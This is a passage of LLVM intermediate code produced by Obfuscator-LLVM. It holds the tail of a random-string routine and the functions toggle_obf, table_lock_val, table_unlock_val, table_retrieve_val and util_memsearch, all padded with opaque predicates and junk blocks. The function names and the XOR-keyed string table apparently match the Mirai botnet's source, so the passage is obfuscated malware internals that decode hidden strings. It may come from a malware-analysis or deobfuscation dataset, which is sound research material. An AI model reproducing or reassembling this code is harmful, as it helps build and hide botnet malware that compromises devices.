  %_13 = sub i32 %129, 3
  %gen14 = mul i32 %_13, 3
  %_15 = shl i32 %129, 3
  %_16 = sub i32 0, %129
  %gen17 = add i32 %_16, 3
  %_18 = shl i32 %129, 3
  %130 = ashr i32 %129, 3
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %7, align 1
  %132 = load i8, i8* %7, align 1
  %133 = zext i8 %132 to i64
  %134 = getelementptr inbounds [33 x i8], [33 x i8]* @rand_alphastr.alphaset, i64 0, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = load i8*, i8** %3, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %3, align 8
  store i8 %135, i8* %136, align 1
  br label %originalBB1

originalBB22alteredBB:                            ; preds = %originalBB22, %72
  %138 = load i32, i32* %4, align 4
  %139 = sext i32 %138 to i64
  %140 = sub i64 %139, 4
  %141 = trunc i64 %140 to i32
  store i32 %141, i32* %4, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %93
  %142 = call i32 @rand_next()
  %143 = zext i32 %142 to i64
  %_27 = sub i64 %143, 33
  %gen28 = mul i64 %_27, 33
  %_29 = shl i64 %143, 33
  %144 = urem i64 %143, 33
  %145 = trunc i64 %144 to i8
  %146 = load i8*, i8** %3, align 8
  %147 = getelementptr inbounds i8, i8* %146, i32 1
  store i8* %147, i8** %3, align 8
  store i8 %145, i8* %146, align 1
  %148 = load i32, i32* %4, align 4
  %_30 = sub i32 0, %148
  %gen31 = add i32 %_30, -1
  %_32 = shl i32 %148, -1
  %_33 = sub i32 0, %148
  %gen34 = add i32 %_33, -1
  %149 = add nsw i32 %148, -1
  store i32 %149, i32* %4, align 4
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %99, %1
  %28 = load i32, i32* @x.49
  %29 = load i32, i32* @y.50
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %3, align 4
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = icmp slt i32 %36, %40
  %42 = load i32, i32* @x.49
  %43 = load i32, i32* @y.50
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %41, label %50, label %102

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, %52
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %58, align 1
  %63 = load i8, i8* %6, align 1
  %64 = zext i8 %63 to i32
  %65 = load %struct.table_value*, %struct.table_value** %4, align 8
  %66 = getelementptr inbounds %struct.table_value, %struct.table_value* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, %64
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %70, align 1
  %75 = load i8, i8* %7, align 1
  %76 = zext i8 %75 to i32
  %77 = load %struct.table_value*, %struct.table_value** %4, align 8
  %78 = getelementptr inbounds %struct.table_value, %struct.table_value* %77, i32 0, i32 0
  %79 = load i8*, i8** %78, align 8
  %80 = load i32, i32* %3, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, %76
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  %87 = load i8, i8* %8, align 1
  %88 = zext i8 %87 to i32
  %89 = load %struct.table_value*, %struct.table_value** %4, align 8
  %90 = getelementptr inbounds %struct.table_value, %struct.table_value* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load i32, i32* %3, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = xor i32 %96, %88
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %94, align 1
  br label %99

; <label>:99:                                     ; preds = %50
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %27

; <label>:102:                                    ; preds = %originalBBpart2
  %103 = load i32, i32* @x.49
  %104 = load i32, i32* @y.50
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %102
  %111 = load i32, i32* @x.49
  %112 = load i32, i32* @y.50
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %119 = load i32, i32* %3, align 4
  %120 = load %struct.table_value*, %struct.table_value** %4, align 8
  %121 = getelementptr inbounds %struct.table_value, %struct.table_value* %120, i32 0, i32 1
  %122 = load i16, i16* %121, align 8
  %123 = zext i16 %122 to i32
  %124 = icmp slt i32 %119, %123
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %102
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.53
  %13 = load i32, i32* @y.54
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.53
  %26 = load i32, i32* @y.54
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %114

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %originalBBpart210, %16
  %18 = load i32, i32* @x.55
  %19 = load i32, i32* @y.56
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %10, align 4
  %27 = load i32, i32* %7, align 4
  %28 = icmp slt i32 %26, %27
  %29 = load i32, i32* @x.55
  %30 = load i32, i32* @y.56
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %97

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i8*, i8** %6, align 8
  %39 = load i32, i32* %10, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = load i8*, i8** %8, align 8
  %45 = load i32, i32* %11, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %43, %49
  br i1 %50, label %51, label %60

; <label>:51:                                     ; preds = %37
  %52 = load i32, i32* %11, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %11, align 4
  %54 = load i32, i32* %9, align 4
  %55 = icmp eq i32 %53, %54
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %10, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %5, align 4
  br label %114

; <label>:59:                                     ; preds = %51
  br label %77

; <label>:60:                                     ; preds = %37
  %61 = load i32, i32* @x.55
  %62 = load i32, i32* @y.56
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  store i32 0, i32* %11, align 4
  %69 = load i32, i32* @x.55
  %70 = load i32, i32* @y.56
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart24, %59
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = load i32, i32* @x.55
  %80 = load i32, i32* @y.56
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i32, i32* %10, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %10, align 4
  %89 = load i32, i32* @x.55
  %90 = load i32, i32* @y.56
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %17

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.55
  %99 = load i32, i32* @y.56
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %97
  store i32 -1, i32* %5, align 4
  %106 = load i32, i32* @x.55
  %107 = load i32, i32* @y.56
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %114

; <label>:114:                                    ; preds = %originalBBpart214, %56, %15
  %115 = load i32, i32* %5, align 4
  ret i32 %115

originalBBalteredBB:                              ; preds = %originalBB, %17
  %116 = load i32, i32* %10, align 4
  %117 = load i32, i32* %7, align 4
  %118 = icmp slt i32 %116, %117
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  store i32 0, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %119 = load i32, i32* %10, align 4
  %_ = sub i32 0, %119
  %gen = add i32 %_, 1
  %_7 = shl i32 %119, 1
  %_8 = shl i32 %119, 1
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %10, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %97
  store i32 -1, i32* %5, align 4
  br label %originalBB12
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
